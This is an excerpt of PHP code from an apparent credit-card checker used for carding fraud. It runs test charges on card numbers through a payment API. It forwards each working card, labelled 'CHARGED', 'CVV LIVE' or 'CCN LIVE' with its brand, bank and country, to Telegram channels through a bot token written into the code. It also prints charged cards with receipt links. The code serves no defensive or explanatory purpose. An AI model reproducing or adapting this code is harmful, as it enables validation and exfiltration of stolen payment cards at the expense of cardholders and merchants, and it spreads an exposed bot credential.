...
$forwardcharged="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CHARGED| *$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardcvv="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@sknonskchargedbyprophoenix&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CVV LIVE| *$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardccn="https://api.telegram.org/bot5962559391:AAErzpu1N9QrF5uMTOYuNzoOeQYk6MHHm2k/sendMessage?chat_id=@CCNCCDump&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ REX CCN LIVE| *$brand* *$category* *$type* |%0A*$bank* | *$country*";
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    ...
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ REX<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
}
